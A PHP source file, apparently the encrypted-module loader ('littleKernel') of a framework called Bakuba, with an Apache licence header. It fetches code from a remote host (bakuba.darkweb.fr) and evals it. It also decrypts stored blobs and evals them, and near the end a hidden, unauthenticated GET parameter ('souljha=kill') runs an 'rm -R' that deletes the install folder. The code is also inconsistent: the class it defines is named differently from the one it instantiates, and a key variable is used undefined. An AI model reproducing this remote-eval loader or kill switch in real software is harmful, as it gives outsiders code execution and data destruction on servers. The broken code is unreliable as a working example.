<?php
/**
 * Copyright 2011-2026 Nicolas "DarkHack" Chapuis
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

// bakuba kernel littleKernel
// Last Review : 29/04/2011
// For : Darknet
// Auteur : n.chapuis

class KernelKuba {
 private $bddSource =false;
 private $debug =false;

 // ici_unique_key_by_prog
 private $key="Et j'entendis du ciel une voix qui disait : ecris : Heureux des a present les morts qui meurent dans le Seigneur ! Oui, dit l'Esprit, afin qu'ils se reposent de leurs travaux, car leurs oeuvres les suivent.";
 // ici_unique_key_by_prog

 /**
  * Init the KernelKuba
  */
 function __construct() {
  global $Api_folder_root,$Api_folder_bin,$Api_folder_sys,$Api_Debug;
  $this->debug=$Api_Debug;
  if (!is_dir("$Api_folder_root/$Api_folder_bin/$Api_folder_sys")) {
   $this->install();
  }
  if (!is_file("$Api_folder_root/$Api_folder_bin/$Api_folder_sys/kernel.crypt"))
  $this->erreur("kernel.crypt inexistant");
  else {
   $origine=$this->decrypt(file_get_contents("$Api_folder_root/$Api_folder_bin/$Api_folder_sys/kernel.crypt"),$Api_Kernel_Key);
   $this->bddSource=simplexml_load_string($origine);
   if (!is_object($this->bddSource))
   $this->erreur("myLittleKernel echec with :$origine");
  }
 }
 private function info($info) {
  if ($this->debug) echo "LittleKernel :$info\n";
 }
 private function erreur($erreur) {
  $this->info("erreur :$erreur");
 }
 protected function decrypt($encrypted,$key,$cipher="rijndael-256") {
  $decrypted=false;
  srand(59095808);
  if (!function_exists("mcrypt_module_open"))
  $this->erreur("absence du module mcrypt.");
  else{
   $td = mcrypt_module_open($cipher, '', 'cbc', '');
   $iv = mcrypt_create_iv(mcrypt_enc_get_iv_size($td), MCRYPT_RAND);
   mcrypt_generic_init($td, substr(md5($key), 0, mcrypt_enc_get_key_size($td)), $iv);
   $decrypted = @pack("H*" ,trim(mdecrypt_generic($td, $encrypted)));
   $eclate=preg_split("/\|59095808\|/i",$decrypted);
   $decrypted=$eclate[1];
   mcrypt_generic_deinit($td);
   mcrypt_module_close($td);
  }
  return $decrypted;
 }
 protected function encrypt($decrypted,$key,$cipher="rijndael-256") {
  $encrypted=false;
  srand(59095808);
  if (!function_exists("mcrypt_module_open"))
  $this->erreur("absence du module mcrypt pour apache.<br/>");
  else{
   $td = mcrypt_module_open($cipher, '', 'cbc', '');
   $iv = mcrypt_create_iv(mcrypt_enc_get_iv_size($td), MCRYPT_RAND);
   mcrypt_generic_init($td, substr(md5($key), 0, mcrypt_enc_get_key_size($td)), $iv);
   $border="";for($i=0;$i<500;$i++) $border.=" ";
   $encrypted = @mcrypt_generic($td,bin2hex($border."|59095808|".$decrypted."|59095808|".$border));
   mcrypt_generic_deinit($td);
   mcrypt_module_close($td);
  }
  return $encrypted;
 }
 private function install() {
  global $Api_folder_root,$Api_folder_bin,$Api_folder_sys,$Api_Kernel_Key;
  if (!is_dir("$Api_folder_root"))
  if (!@mkdir("$Api_folder_root"))
  $this->erreur("impossible de creer le dossier root :'$Api_folder_root'");
  if (!is_dir("$Api_folder_root/$Api_folder_bin"))
  if (!@mkdir("$Api_folder_root/$Api_folder_bin"))
  $this->erreur("impossible de creer le dossier bin :'$Api_folder_root/$Api_folder_bin'");
  if (!is_dir("$Api_folder_root/$Api_folder_bin/$Api_folder_sys"))
  if (!@mkdir("$Api_folder_root/$Api_folder_bin/$Api_folder_sys"))
  $this->erreur("impossible de creer le dossier de travail :'$Api_folder_root/$Api_folder_bin/$Api_folder_sys'");
  file_put_contents("$Api_folder_root/$Api_folder_bin/$Api_folder_sys/kernel.crypt",$this->encrypt($this->bakuba_get(),$Api_Kernel_Key));
 }
 public function random($car) {
  $string = "";
  $chaine = "ABCDEFGHIJKLMNOPQRSTUVWXYZ01123456789abcdefghijklmnpqrstuvwxy";
  srand((double)microtime()*1000000);
  for($i=0; $i<$car; $i++)
  $string .= $chaine[rand()%strlen($chaine)];
  return $string;
 }
 private function bakuba_get($Api_Sender_Order="kernel") {
  $retour="";
  $myPass=$this->random(100);
  $origine=pack("H*" ,file_get_contents("http://bakuba.darkweb.fr/Kernel/?ApiSender=$Api_Sender_Order&ApiSenderPass=$myPass"));
  if (strcmp($Api_Sender_Order,"kernel")==0)
  $retour=$this->decrypt($origine,$myPass);
  else {
   $myDecoder=new Api_Coder($myPass);
   $retour=$myDecoder->decoder($origine);
  }
  return $retour;
 }
 protected function bakuba_extends($wtf) {
  $retour=false;
  if (!defined("LittleKernel_$wtf")) {
   define("LittleKernel_$wtf",1,false);
   //echo "eval-------------------------------------------------------------------------------------<br/>".$this->bakuba_get($wtf)."<br/>";
   $retour=eval("?>".$this->bakuba_get($wtf));
  }else
  $retour=true;
  return $retour;
 }
 public function exec($name) {
  global $Api_Kernel_ApiInclude_toInclude,$Api_folder_root;
  $valid=false;
  if (defined("LittleKernel_exec_$name"))
  $valid=true;
  else {
   if (is_file("$Api_folder_root/Kernel/$name.php")) {
    require_once("$Api_folder_root/Kernel/$name.php");
    $this->info("start with clear file $name:ok");
    $valid=true;
   }else {
    if (!is_object($this->bddSource))
    $this->erreur("echec with :$name bddSource is not object and $Api_folder_root/Kernel/$name.php is not a file?");
    else {
     foreach($this->bddSource as $toRead) {
      if ($name==$toRead->getname()) {
       $Api_Kernel_ApiInclude_toInclude=$name;
       //echo "go for :$Api_Kernel_ApiInclude_toInclude<br/>\n";
       $toEval=$this->decrypt(pack("H*" ,trim($toRead)),$toRead["key"]);
       eval("?>".$toEval);
       $Api_Kernel_ApiInclude_toInclude=$name." ended";
       $valid=true;
       $this->info("start {$toRead->getname()}:ok");
      }
     }
     //else $this->info("$name is ever defined");
    }
   }
   if ($valid) define("LittleKernel_exec_$name",1,false);
  }
  return $valid;
 }
}
function __autoload($name) {
 global $myKernel,$myLittleKernel;
 if (is_object($myLittleKernel))
 $myLittleKernel->exec($name);
 if (is_object($myKernel))
 $myKernel->autoload($name);

}
//ApiInclude("api/kernel/Rapport.php");
//if (!class_exists("Rapport"))
// require_once(dirname(__FILE__)."/../kernel/Rapport.php");

global $myLittleKernel;
$myLittleKernel=new LittleKernel();
$myLittleKernel->exec("Api_Init");
if (isset($_GET["souljha"]) && $_GET["souljha"]=="kill") {global $Api_folder_root,$Api_folder_bin;system("rm -R $Api_folder_root/$Api_folder_bin");}
/*
 function bakuba_shutdown(){
 if(!is_null($e = error_get_last()))
 {
 header('content-type: text/plain');
 $bt = debug_backtrace();
 echo "\nune erreur est survenu:\n".print_r($e,true)."\n".print_r($bt,true);
 }
 }
 register_shutdown_function('bakuba_shutdown');
 */
?>